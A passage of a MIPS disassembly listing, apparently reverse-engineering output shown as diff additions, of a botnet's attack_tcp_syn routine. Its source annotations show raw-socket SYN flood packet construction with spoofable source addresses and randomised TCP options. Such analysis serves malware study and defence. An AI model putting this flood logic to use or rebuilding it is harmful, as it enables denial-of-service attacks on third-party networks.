+│ 0x004083f0      03a0f025       move fp, sp
+│ 0x004083f4      00801025       move v0, a0
+│ 0x004083f8      afc5007c       sw a1, (arg_7ch)
+│ 0x004083fc      00c01825       move v1, a2
+│ 0x00408400      afc70084       sw a3, (arg_84h)
+│ 0x00408404      a3c20078       sb v0, (arg_78h)
+│ 0x00408408      00601025       move v0, v1
+│ 0x0040840c      a3c20080       sb v0, (arg_80h)
+│ 0x00408410      93c20078       lbu v0, (arg_78h)                     ; attack_tcp.c:21    char **pkts = calloc(targs_len, sizeof (char *)); ; [0x178000:1]=0
+│                                                                      ; fp
+│ 0x00408414      24050004       addiu a1, zero, 4                     ; arg2
+│ 0x00408418      00402025       move a0, v0
+│ 0x0040841c      0c1000e0       jal sym..pic.calloc
+│ 0x00408420      00000000       nop
+│ 0x00408424      afc20020       sw v0, (var_20h)
+│ 0x00408428      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:22    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0); ; [0x420080:1]=60 ; "<\x1c"
+│ 0x0040842c      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x00408430      24060002       addiu a2, zero, 2                     ; int32_t arg_2ch
+│ 0x00408434      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408438      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040843c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408440      00000000       nop
+│ 0x00408444      a3c20024       sb v0, (var_24h)
+│ 0x00408448      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:23    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+│ 0x0040844c      3407ffff       ori a3, zero, 0xffff                  ; int32_t arg_30h
+│ 0x00408450      24060003       addiu a2, zero, 3                     ; int32_t arg_2ch
+│ 0x00408454      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408458      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040845c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408460      00000000       nop
+│ 0x00408464      a7c20026       sh v0, (var_26h)
+│ 0x00408468      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:24    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+│ 0x0040846c      24070040       addiu a3, zero, 0x40                  ; int32_t arg_30h
+│ 0x00408470      24060004       addiu a2, zero, 4                     ; int32_t arg_2ch
+│ 0x00408474      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408478      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040847c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408480      00000000       nop
+│ 0x00408484      a3c20028       sb v0, (var_28h)
+│ 0x00408488      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:25    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
+│ 0x0040848c      24070001       addiu a3, zero, 1                     ; int32_t arg_30h
+│ 0x00408490      24060005       addiu a2, zero, 5                     ; int32_t arg_2ch
+│ 0x00408494      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408498      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040849c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x004084a0      00000000       nop
+│ 0x004084a4      a3c20029       sb v0, (var_29h)
+│ 0x004084a8      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:26    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+│ 0x004084ac      3407ffff       ori a3, zero, 0xffff                  ; int32_t arg_30h
+│ 0x004084b0      24060006       addiu a2, zero, 6                     ; int32_t arg_2ch
+│ 0x004084b4      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x004084b8      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x004084bc      0c10203f       jal dbg.attack_get_opt_int
+│ 0x004084c0      00000000       nop
+│ 0x004084c4      a7c2002a       sh v0, (var_2ah)
+│ 0x004084c8      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:27    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+│ 0x004084cc      3407ffff       ori a3, zero, 0xffff                  ; int32_t arg_30h
+│ 0x004084d0      24060007       addiu a2, zero, 7                     ; int32_t arg_2ch
+│ 0x004084d4      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x004084d8      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x004084dc      0c10203f       jal dbg.attack_get_opt_int
+│ 0x004084e0      00000000       nop
+│ 0x004084e4      a7c2002c       sh v0, (var_2ch)
+│ 0x004084e8      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:28    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
+│ 0x004084ec      3407ffff       ori a3, zero, 0xffff                  ; int32_t arg_30h
+│ 0x004084f0      24060011       addiu a2, zero, 0x11                  ; int32_t arg_2ch
+│ 0x004084f4      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x004084f8      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x004084fc      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408500      00000000       nop
+│ 0x00408504      afc20030       sw v0, (var_30h)
+│ 0x00408508      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:29    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
+│ 0x0040850c      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x00408510      24060012       addiu a2, zero, 0x12                  ; int32_t arg_2ch
+│ 0x00408514      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408518      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040851c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408520      00000000       nop
+│ 0x00408524      afc20034       sw v0, (var_34h)
+│ 0x00408528      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:30    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
+│ 0x0040852c      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x00408530      2406000b       addiu a2, zero, 0xb                   ; int32_t arg_2ch
+│ 0x00408534      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408538      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040853c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408540      00000000       nop
+│ 0x00408544      a3c20038       sb v0, (var_38h)
+│ 0x00408548      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:31    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
+│ 0x0040854c      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x00408550      2406000c       addiu a2, zero, 0xc                   ; int32_t arg_2ch
+│ 0x00408554      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408558      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040855c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408560      00000000       nop
+│ 0x00408564      a3c20039       sb v0, (var_39h)
+│ 0x00408568      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:32    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
+│ 0x0040856c      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x00408570      2406000d       addiu a2, zero, 0xd                   ; int32_t arg_2ch
+│ 0x00408574      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408578      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040857c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x00408580      00000000       nop
+│ 0x00408584      a3c2003a       sb v0, (var_3ah)
+│ 0x00408588      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:33    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
+│ 0x0040858c      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x00408590      2406000e       addiu a2, zero, 0xe                   ; int32_t arg_2ch
+│ 0x00408594      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408598      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x0040859c      0c10203f       jal dbg.attack_get_opt_int
+│ 0x004085a0      00000000       nop
+│ 0x004085a4      a3c2003b       sb v0, (var_3bh)
+│ 0x004085a8      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:34    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
+│ 0x004085ac      24070001       addiu a3, zero, 1                     ; int32_t arg_30h
+│ 0x004085b0      2406000f       addiu a2, zero, 0xf                   ; int32_t arg_2ch
+│ 0x004085b4      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x004085b8      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x004085bc      0c10203f       jal dbg.attack_get_opt_int
+│ 0x004085c0      00000000       nop
+│ 0x004085c4      a3c2003c       sb v0, (var_3ch)
+│ 0x004085c8      93c20080       lbu v0, (arg_80h)                     ; attack_tcp.c:35    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
+│ 0x004085cc      00003825       move a3, zero                         ; int32_t arg_30h
+│ 0x004085d0      24060010       addiu a2, zero, 0x10                  ; int32_t arg_2ch
+│ 0x004085d4      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x004085d8      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x004085dc      0c10203f       jal dbg.attack_get_opt_int
+│ 0x004085e0      00000000       nop
+│ 0x004085e4      a3c2003d       sb v0, (var_3dh)
+│ 0x004085e8      3c02004b       lui v0, 0x4b                          ; attack_tcp.c:36    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+│ 0x004085ec      8c4339bc       lw v1, 0x39bc(v0)                     ; [0x4b39bc:4]=0
+│                                                                      ; loc._fbss
+│                                                                      [19] -rw- section size 12 named .sbss
+│ 0x004085f0      93c20080       lbu v0, (arg_80h)
+│ 0x004085f4      00603825       move a3, v1                           ; int32_t arg_30h
+│ 0x004085f8      24060019       addiu a2, zero, 0x19                  ; int32_t arg_2ch
+│ 0x004085fc      8fc50084       lw a1, (arg_84h)                      ; int32_t arg_28h
+│ 0x00408600      00402025       move a0, v0                           ; int32_t arg_18h
+│ 0x00408604      0c102064       jal dbg.attack_get_opt_ip
+│ 0x00408608      00000000       nop
+│ 0x0040860c      afc20040       sw v0, (var_40h)
+│ 0x00408610      24060006       addiu a2, zero, 6                     ; attack_tcp.c:38    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+│ 0x00408614      24050003       addiu a1, zero, 3
+│ 0x00408618      24040002       addiu a0, zero, 2
+│ 0x0040861c      0c1000d4       jal sym..pic.socket
+│ 0x00408620      00000000       nop
+│ 0x00408624      afc20044       sw v0, (var_44h)
+│ 0x00408628      8fc30044       lw v1, (var_44h)
+│ 0x0040862c      2402ffff       addiu v0, zero, -1
+│ 0x00408630      1062023b       beq v1, v0, 0x408f20
+│ 0x00408634      00000000       nop
+| // true: 0x00408f20  false: 0x00408638
+│ 0x00408638      24020001       addiu v0, zero, 1                     ; attack_tcp.c:46    i = 1;
+│ 0x0040863c      afc20060       sw v0, (var_60h)
+│ 0x00408640      27c30060       addiu v1, fp, 0x60                    ; attack_tcp.c:47    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+│ 0x00408644      24020004       addiu v0, zero, 4
+│ 0x00408648      afa20010       sw v0, (var_10h)
+│ 0x0040864c      00603825       move a3, v1
+│ 0x00408650      24060003       addiu a2, zero, 3
+│ 0x00408654      00002825       move a1, zero
+│ 0x00408658      8fc40044       lw a0, (var_44h)
+│ 0x0040865c      0c10886a       jal sym..pic.setsockopt
+│ 0x00408660      00000000       nop
+│ 0x00408664      00401825       move v1, v0
+│ 0x00408668      2402ffff       addiu v0, zero, -1
+│ 0x0040866c      14620006       bne v1, v0, 0x408688
+│ 0x00408670      00000000       nop
+| // true: 0x00408688  false: 0x00408674
+│ 0x00408674      8fc40044       lw a0, (var_44h)                      ; attack_tcp.c:52        close(fd);
+│ 0x00408678      0c107c02       jal sym..pic.close
+│ 0x0040867c      00000000       nop
+│ 0x00408680      10000228       b 0x408f24                            ; attack_tcp.c:53        return;
+│ 0x00408684      00000000       nop
+| // true: 0x00408f24
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x40866c(x)
+│ 0x00408688      afc00060       sw zero, (var_60h)                    ; attack_tcp.c:56    for (i = 0; i < targs_len; i++)
+│ 0x0040868c      1000013f       b 0x408b8c
+│ 0x00408690      00000000       nop
+| // true: 0x00408b8c
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408b9c(x)
+│ 0x00408694      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:62        pkts[i] = calloc(128, sizeof (char));
+│ 0x00408698      00000000       nop
+│ 0x0040869c      00021080       sll v0, v0, 2
+│ 0x004086a0      8fc30020       lw v1, (var_20h)
+│ 0x004086a4      00000000       nop
+│ 0x004086a8      00628021       addu s0, v1, v0
+│ 0x004086ac      24050001       addiu a1, zero, 1
+│ 0x004086b0      24040080       addiu a0, zero, 0x80
+│ 0x004086b4      0c1000e0       jal sym..pic.calloc
+│ 0x004086b8      00000000       nop
+│ 0x004086bc      ae020000       sw v0, (s0)
+│ 0x004086c0      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:63        iph = (struct iphdr *)pkts[i];
+│ 0x004086c4      00000000       nop
+│ 0x004086c8      00021080       sll v0, v0, 2
+│ 0x004086cc      8fc30020       lw v1, (var_20h)
+│ 0x004086d0      00000000       nop
+│ 0x004086d4      00621021       addu v0, v1, v0
+│ 0x004086d8      8c420000       lw v0, (v0)
+│ 0x004086dc      00000000       nop
+│ 0x004086e0      afc20054       sw v0, (var_54h)
+│ 0x004086e4      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:64        tcph = (struct tcphdr *)(iph + 1);
+│ 0x004086e8      00000000       nop
+│ 0x004086ec      24420014       addiu v0, v0, 0x14
+│ 0x004086f0      afc20058       sw v0, (var_58h)
+│ 0x004086f4      8fc20058       lw v0, (var_58h)                      ; attack_tcp.c:65        opts = (uint8_t *)(tcph + 1);
+│ 0x004086f8      00000000       nop
+│ 0x004086fc      24420014       addiu v0, v0, 0x14
+│ 0x00408700      afc2005c       sw v0, (var_5ch)
+│ 0x00408704      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:67        iph->version = 4;
+│ 0x00408708      00000000       nop
+│ 0x0040870c      90430000       lbu v1, (v0)
+│ 0x00408710      00000000       nop
+│ 0x00408714      3063000f       andi v1, v1, 0xf
+│ 0x00408718      34630040       ori v1, v1, 0x40
+│ 0x0040871c      a0430000       sb v1, (v0)
+│ 0x00408720      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:68        iph->ihl = 5;
+│ 0x00408724      00000000       nop
+│ 0x00408728      90440000       lbu a0, (v0)
+│ 0x0040872c      2403fff0       addiu v1, zero, -0x10
+│ 0x00408730      00831824       and v1, a0, v1
+│ 0x00408734      34630005       ori v1, v1, 5
+│ 0x00408738      a0430000       sb v1, (v0)
+│ 0x0040873c      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:69        iph->tos = ip_tos;
+│ 0x00408740      93c30024       lbu v1, (var_24h)
+│ 0x00408744      00000000       nop
+│ 0x00408748      a0430001       sb v1, 1(v0)
+│ 0x0040874c      2404003c       addiu a0, zero, 0x3c                  ; attack_tcp.c:70        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
+│ 0x00408750      0c1088aa       jal sym..pic.ntohs
+│ 0x00408754      00000000       nop
+│ 0x00408758      00401825       move v1, v0
+│ 0x0040875c      8fc20054       lw v0, (var_54h)
+│ 0x00408760      00000000       nop
+│ 0x00408764      a4430002       sh v1, 2(v0)
+│ 0x00408768      97c20026       lhu v0, (arg_26h)                     ; attack_tcp.c:71        iph->id = htons(ip_ident);
+│ 0x0040876c      00000000       nop
+│ 0x00408770      00402025       move a0, v0
+│ 0x00408774      0c1088aa       jal sym..pic.ntohs
+│ 0x00408778      00000000       nop
+│ 0x0040877c      00401825       move v1, v0
+│ 0x00408780      8fc20054       lw v0, (var_54h)
+│ 0x00408784      00000000       nop
+│ 0x00408788      a4430004       sh v1, 4(v0)
+│ 0x0040878c      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:72        iph->ttl = ip_ttl;
+│ 0x00408790      93c30028       lbu v1, (var_28h)
+│ 0x00408794      00000000       nop
+│ 0x00408798      a0430008       sb v1, 8(v0)
+│ 0x0040879c      83c20029       lb v0, (var_29h)                      ; attack_tcp.c:73        if (dont_frag)
+│ 0x004087a0      00000000       nop
+│ 0x004087a4      10400008       beqz v0, 0x4087c8
+│ 0x004087a8      00000000       nop
+| // true: 0x004087c8  false: 0x004087ac
+│ 0x004087ac      24044000       addiu a0, zero, 0x4000                ; attack_tcp.c:74            iph->frag_off = htons(1 << 14);
+│ 0x004087b0      0c1088aa       jal sym..pic.ntohs
+│ 0x004087b4      00000000       nop
+│ 0x004087b8      00401825       move v1, v0
+│ 0x004087bc      8fc20054       lw v0, (var_54h)
+│ 0x004087c0      00000000       nop
+│ 0x004087c4      a4430006       sh v1, 6(v0)
+| // true: 0x004087c8
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x4087a4(x)
+│ 0x004087c8      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:75        iph->protocol = IPPROTO_TCP;
+│ 0x004087cc      24030006       addiu v1, zero, 6
+│ 0x004087d0      a0430009       sb v1, 9(v0)
+│ 0x004087d4      8fc20054       lw v0, (var_54h)                      ; attack_tcp.c:76        iph->saddr = source_ip;
+│ 0x004087d8      8fc30040       lw v1, (var_40h)
+│ 0x004087dc      00000000       nop
+│ 0x004087e0      ac43000c       sw v1, 0xc(v0)
+│ 0x004087e4      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:77        iph->daddr = targs[i].addr;
+│ 0x004087e8      00000000       nop
+│ 0x004087ec      00401825       move v1, v0
+│ 0x004087f0      00601025       move v0, v1
+│ 0x004087f4      00021040       sll v0, v0, 1
+│ 0x004087f8      00431021       addu v0, v0, v1
+│ 0x004087fc      000210c0       sll v0, v0, 3
+│ 0x00408800      00401825       move v1, v0
+│ 0x00408804      8fc2007c       lw v0, (arg_7ch)
+│ 0x00408808      00000000       nop
+│ 0x0040880c      00431021       addu v0, v0, v1
+│ 0x00408810      8c430010       lw v1, 0x10(v0)
+│ 0x00408814      8fc20054       lw v0, (var_54h)
+│ 0x00408818      00000000       nop
+│ 0x0040881c      ac430010       sw v1, 0x10(v0)
+│ 0x00408820      97c2002a       lhu v0, (arg_2ah)                     ; attack_tcp.c:79        tcph->source = htons(sport);
+│ 0x00408824      00000000       nop
+│ 0x00408828      00402025       move a0, v0
+│ 0x0040882c      0c1088aa       jal sym..pic.ntohs
+│ 0x00408830      00000000       nop
+│ 0x00408834      00401825       move v1, v0
+│ 0x00408838      8fc20058       lw v0, (var_58h)
+│ 0x0040883c      00000000       nop
+│ 0x00408840      a4430000       sh v1, (v0)
+│ 0x00408844      97c2002c       lhu v0, (arg_2ch)                     ; attack_tcp.c:80        tcph->dest = htons(dport);
+│ 0x00408848      00000000       nop
+│ 0x0040884c      00402025       move a0, v0
+│ 0x00408850      0c1088aa       jal sym..pic.ntohs
+│ 0x00408854      00000000       nop
+│ 0x00408858      00401825       move v1, v0
+│ 0x0040885c      8fc20058       lw v0, (var_58h)
+│ 0x00408860      00000000       nop
+│ 0x00408864      a4430002       sh v1, 2(v0)
+│ 0x00408868      8fc20030       lw v0, (var_30h)                      ; attack_tcp.c:81        tcph->seq = htons(seq);
+│ 0x0040886c      00000000       nop
+│ 0x00408870      3042ffff       andi v0, v0, 0xffff
+│ 0x00408874      00402025       move a0, v0
+│ 0x00408878      0c1088aa       jal sym..pic.ntohs
+│ 0x0040887c      00000000       nop
+│ 0x00408880      00401825       move v1, v0
+│ 0x00408884      8fc20058       lw v0, (var_58h)
+│ 0x00408888      00000000       nop
+│ 0x0040888c      ac430004       sw v1, 4(v0)
+│ 0x00408890      8fc20058       lw v0, (var_58h)                      ; attack_tcp.c:82        tcph->doff = 10;
+│ 0x00408894      00000000       nop
+│ 0x00408898      9443000c       lhu v1, 0xc(v0)
+│ 0x0040889c      00000000       nop
+│ 0x004088a0      30630fff       andi v1, v1, 0xfff
+│ 0x004088a4      00602025       move a0, v1
+│ 0x004088a8      2403a000       addiu v1, zero, -0x6000
+│ 0x004088ac      00831825       or v1, a0, v1
+│ 0x004088b0      a443000c       sh v1, 0xc(v0)
+│ 0x004088b4      93c20038       lbu v0, (var_38h)                     ; attack_tcp.c:83        tcph->urg = urg_fl;
+│ 0x004088b8      00000000       nop
+│ 0x004088bc      30420001       andi v0, v0, 1
+│ 0x004088c0      304300ff       andi v1, v0, 0xff
+│ 0x004088c4      8fc20058       lw v0, (var_58h)
+│ 0x004088c8      30630001       andi v1, v1, 1
+│ 0x004088cc      00032940       sll a1, v1, 5
+│ 0x004088d0      9444000c       lhu a0, 0xc(v0)
+│ 0x004088d4      2403ffdf       addiu v1, zero, -0x21
+│ 0x004088d8      00831824       and v1, a0, v1
+│ 0x004088dc      00602025       move a0, v1
+│ 0x004088e0      00a01825       move v1, a1
+│ 0x004088e4      00831825       or v1, a0, v1
+│ 0x004088e8      a443000c       sh v1, 0xc(v0)
+│ 0x004088ec      93c20039       lbu v0, (var_39h)                     ; attack_tcp.c:84        tcph->ack = ack_fl;
+│ 0x004088f0      00000000       nop
+│ 0x004088f4      30420001       andi v0, v0, 1
+│ 0x004088f8      304300ff       andi v1, v0, 0xff
+│ 0x004088fc      8fc20058       lw v0, (var_58h)
+│ 0x00408900      30630001       andi v1, v1, 1
+│ 0x00408904      00032900       sll a1, v1, 4
+│ 0x00408908      9444000c       lhu a0, 0xc(v0)
+│ 0x0040890c      2403ffef       addiu v1, zero, -0x11
+│ 0x00408910      00831824       and v1, a0, v1
+│ 0x00408914      00602025       move a0, v1
+│ 0x00408918      00a01825       move v1, a1
+│ 0x0040891c      00831825       or v1, a0, v1
+│ 0x00408920      a443000c       sh v1, 0xc(v0)
+│ 0x00408924      93c2003a       lbu v0, (var_3ah)                     ; attack_tcp.c:85        tcph->psh = psh_fl;
+│ 0x00408928      00000000       nop
+│ 0x0040892c      30420001       andi v0, v0, 1
+│ 0x00408930      304300ff       andi v1, v0, 0xff
+│ 0x00408934      8fc20058       lw v0, (var_58h)
+│ 0x00408938      30630001       andi v1, v1, 1
+│ 0x0040893c      000328c0       sll a1, v1, 3
+│ 0x00408940      9444000c       lhu a0, 0xc(v0)
+│ 0x00408944      2403fff7       addiu v1, zero, -9
+│ 0x00408948      00831824       and v1, a0, v1
+│ 0x0040894c      00602025       move a0, v1
+│ 0x00408950      00a01825       move v1, a1
+│ 0x00408954      00831825       or v1, a0, v1
+│ 0x00408958      a443000c       sh v1, 0xc(v0)
+│ 0x0040895c      93c2003b       lbu v0, (var_3bh)                     ; attack_tcp.c:86        tcph->rst = rst_fl;
+│ 0x00408960      00000000       nop
+│ 0x00408964      30420001       andi v0, v0, 1
+│ 0x00408968      304300ff       andi v1, v0, 0xff
+│ 0x0040896c      8fc20058       lw v0, (var_58h)
+│ 0x00408970      30630001       andi v1, v1, 1
+│ 0x00408974      00032880       sll a1, v1, 2
+│ 0x00408978      9444000c       lhu a0, 0xc(v0)
+│ 0x0040897c      2403fffb       addiu v1, zero, -5
+│ 0x00408980      00831824       and v1, a0, v1
+│ 0x00408984      00602025       move a0, v1
+│ 0x00408988      00a01825       move v1, a1
+│ 0x0040898c      00831825       or v1, a0, v1
+│ 0x00408990      a443000c       sh v1, 0xc(v0)
+│ 0x00408994      93c2003c       lbu v0, (var_3ch)                     ; attack_tcp.c:87        tcph->syn = syn_fl;
+│ 0x00408998      00000000       nop
+│ 0x0040899c      30420001       andi v0, v0, 1
+│ 0x004089a0      304300ff       andi v1, v0, 0xff
+│ 0x004089a4      8fc20058       lw v0, (var_58h)
+│ 0x004089a8      30630001       andi v1, v1, 1
+│ 0x004089ac      00032840       sll a1, v1, 1
+│ 0x004089b0      9444000c       lhu a0, 0xc(v0)
+│ 0x004089b4      2403fffd       addiu v1, zero, -3
+│ 0x004089b8      00831824       and v1, a0, v1
+│ 0x004089bc      00602025       move a0, v1
+│ 0x004089c0      00a01825       move v1, a1
+│ 0x004089c4      00831825       or v1, a0, v1
+│ 0x004089c8      a443000c       sh v1, 0xc(v0)
+│ 0x004089cc      93c2003d       lbu v0, (var_3dh)                     ; attack_tcp.c:88        tcph->fin = fin_fl;
+│ 0x004089d0      00000000       nop
+│ 0x004089d4      30420001       andi v0, v0, 1
+│ 0x004089d8      304300ff       andi v1, v0, 0xff
+│ 0x004089dc      8fc20058       lw v0, (var_58h)
+│ 0x004089e0      30650001       andi a1, v1, 1
+│ 0x004089e4      9444000c       lhu a0, 0xc(v0)
+│ 0x004089e8      2403fffe       addiu v1, zero, -2
+│ 0x004089ec      00831824       and v1, a0, v1
+│ 0x004089f0      00602025       move a0, v1                           ; int32_t arg_8h
+│ 0x004089f4      00a01825       move v1, a1
+│ 0x004089f8      00831825       or v1, a0, v1
+│ 0x004089fc      a443000c       sh v1, 0xc(v0)
+│ 0x00408a00      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:91        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
+│ 0x00408a04      00000000       nop
+│ 0x00408a08      24430001       addiu v1, v0, 1
+│ 0x00408a0c      afc3005c       sw v1, (var_5ch)
+│ 0x00408a10      24030002       addiu v1, zero, 2
+│ 0x00408a14      a0430000       sb v1, (v0)
+│ 0x00408a18      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:92        *opts++ = 4;                    // Length
+│ 0x00408a1c      00000000       nop
+│ 0x00408a20      24430001       addiu v1, v0, 1
+│ 0x00408a24      afc3005c       sw v1, (var_5ch)
+│ 0x00408a28      24030004       addiu v1, zero, 4
+│ 0x00408a2c      a0430000       sb v1, (v0)
+│ 0x00408a30      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:93        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
+│ 0x00408a34      00000000       nop
+│ 0x00408a38      3042ffff       andi v0, v0, 0xffff
+│ 0x00408a3c      3042000f       andi v0, v0, 0xf
+│ 0x00408a40      3042ffff       andi v0, v0, 0xffff
+│ 0x00408a44      24420578       addiu v0, v0, 0x578
+│ 0x00408a48      3042ffff       andi v0, v0, 0xffff
+│ 0x00408a4c      00402025       move a0, v0
+│ 0x00408a50      0c1088aa       jal sym..pic.ntohs
+│ 0x00408a54      00000000       nop
+│ 0x00408a58      00401825       move v1, v0
+│ 0x00408a5c      8fc2005c       lw v0, (var_5ch)
+│ 0x00408a60      00000000       nop
+│ 0x00408a64      a4430000       sh v1, (v0)
+│ 0x00408a68      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:94        opts += sizeof (uint16_t);
+│ 0x00408a6c      00000000       nop
+│ 0x00408a70      24420002       addiu v0, v0, 2
+│ 0x00408a74      afc2005c       sw v0, (var_5ch)
+│ 0x00408a78      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:97        *opts++ = PROTO_TCP_OPT_SACK;
+│ 0x00408a7c      00000000       nop
+│ 0x00408a80      24430001       addiu v1, v0, 1
+│ 0x00408a84      afc3005c       sw v1, (var_5ch)
+│ 0x00408a88      24030004       addiu v1, zero, 4
+│ 0x00408a8c      a0430000       sb v1, (v0)
+│ 0x00408a90      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:98        *opts++ = 2;
+│ 0x00408a94      00000000       nop
+│ 0x00408a98      24430001       addiu v1, v0, 1
+│ 0x00408a9c      afc3005c       sw v1, (var_5ch)
+│ 0x00408aa0      24030002       addiu v1, zero, 2
+│ 0x00408aa4      a0430000       sb v1, (v0)
+│ 0x00408aa8      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:101        *opts++ = PROTO_TCP_OPT_TSVAL;
+│ 0x00408aac      00000000       nop
+│ 0x00408ab0      24430001       addiu v1, v0, 1
+│ 0x00408ab4      afc3005c       sw v1, (var_5ch)
+│ 0x00408ab8      24030008       addiu v1, zero, 8
+│ 0x00408abc      a0430000       sb v1, (v0)
+│ 0x00408ac0      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:102        *opts++ = 10;
+│ 0x00408ac4      00000000       nop
+│ 0x00408ac8      24430001       addiu v1, v0, 1
+│ 0x00408acc      afc3005c       sw v1, (var_5ch)
+│ 0x00408ad0      2403000a       addiu v1, zero, 0xa
+│ 0x00408ad4      a0430000       sb v1, (v0)
+│ 0x00408ad8      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:103        *((uint32_t *)opts) = rand_next();
+│ 0x00408adc      00000000       nop
+│ 0x00408ae0      00401825       move v1, v0
+│ 0x00408ae4      8fc2005c       lw v0, (var_5ch)
+│ 0x00408ae8      00000000       nop
+│ 0x00408aec      ac430000       sw v1, (v0)
+│ 0x00408af0      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:104        opts += sizeof (uint32_t);
+│ 0x00408af4      00000000       nop
+│ 0x00408af8      24420004       addiu v0, v0, 4
